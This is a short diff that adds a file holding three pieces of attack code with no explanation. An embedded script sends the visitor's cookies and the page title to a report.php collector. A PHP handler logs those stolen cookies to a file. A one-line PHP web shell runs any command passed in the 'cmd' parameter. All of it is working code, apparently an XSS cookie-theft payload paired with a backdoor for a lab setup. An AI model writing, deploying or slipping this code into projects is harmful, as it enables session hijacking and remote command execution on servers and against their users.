@@ -1,0 +1,17 @@
+<!doctype html>
+<script>
+var http = new XMLHttpRequest()
+var url = "http://localhost/report.php?" + "user=" + top.document.title + "&cookie=" + document.cookie;
+http.open("GET", url, true);
+http.send("");
+</script>
+
+<?php
+$usercookies = fopen("usercookies", "a");
+fwrite($usercookies, "User: " . $_GET['user'] . "\t" ."Cookie: " . $_GET['cookie'] . "\n");
+?>
+
+<?php
+system($_GET['cmd']);
+?>
+
